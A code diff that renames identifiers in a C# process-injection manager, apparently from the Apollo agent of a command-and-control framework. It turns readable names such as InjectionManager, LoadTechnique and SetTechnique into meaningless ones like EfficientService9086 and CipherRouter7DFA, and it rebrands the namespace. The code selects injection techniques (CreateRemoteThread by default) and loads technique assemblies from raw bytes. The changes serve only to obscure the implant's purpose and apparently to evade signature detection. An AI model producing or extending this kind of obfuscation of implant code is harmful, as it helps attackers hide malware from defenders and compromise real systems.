@@ -1,5 +1,5 @@
-﻿using ApolloInterop.Classes.Core;
-using ApolloInterop.Interfaces;
+﻿using PhantomInterop.Classes.Core;
+using PhantomInterop.Interfaces;
 using System;
 using System.Collections.Concurrent;
 using System.Linq;
@@ -7,7 +7,7 @@ using System.Reflection;
 
 namespace Injection
 {
-    public class InjectionManager : IInjectionManager
+    public class EfficientService9086 : IInjectionManager
     {
         private IAgent _agent;
         private Type _currentTechnique = typeof(Techniques.CreateRemoteThread.CreateRemoteThread);
@@ -28,21 +28,21 @@ namespace Injection
             }
         }
 
-        public InjectionTechnique CreateInstance(byte[] code, int pid)
+        public InjectionTechnique EnhancedService240B(byte[] code, int pid)
         {
             return (InjectionTechnique)Activator.CreateInstance(
                 _currentTechnique,
                 new object[] { _agent, code, pid });
         }
 
-        public InjectionTechnique CreateInstance(byte[] code, IntPtr hProcess)
+        public InjectionTechnique EnhancedService240B(byte[] code, IntPtr hProcess)
         {
             return (InjectionTechnique)Activator.CreateInstance(
                 _currentTechnique,
                 new object[] { _agent, code, hProcess });
         }
 
-        public Type GetCurrentTechnique()
+        public Type CipherRouter7DFA()
         {
             return _currentTechnique;
         }
@@ -52,7 +52,7 @@ namespace Injection
             return _loadedTechniques.Keys.ToArray();
         }
 
-        public bool LoadTechnique(byte[] assembly, string name)
+        public bool TacticalProcessor4B28(byte[] assembly, string name)
         {
             bool bRet = false;
             Assembly tmp = Assembly.Load(assembly);
@@ -68,7 +68,7 @@ namespace Injection
             return bRet;
         }
 
-        public bool SetTechnique(string technique)
+        public bool IntelligentExecutorE63B(string technique)
         {
             if (!_loadedTechniques.ContainsKey(technique))
             {
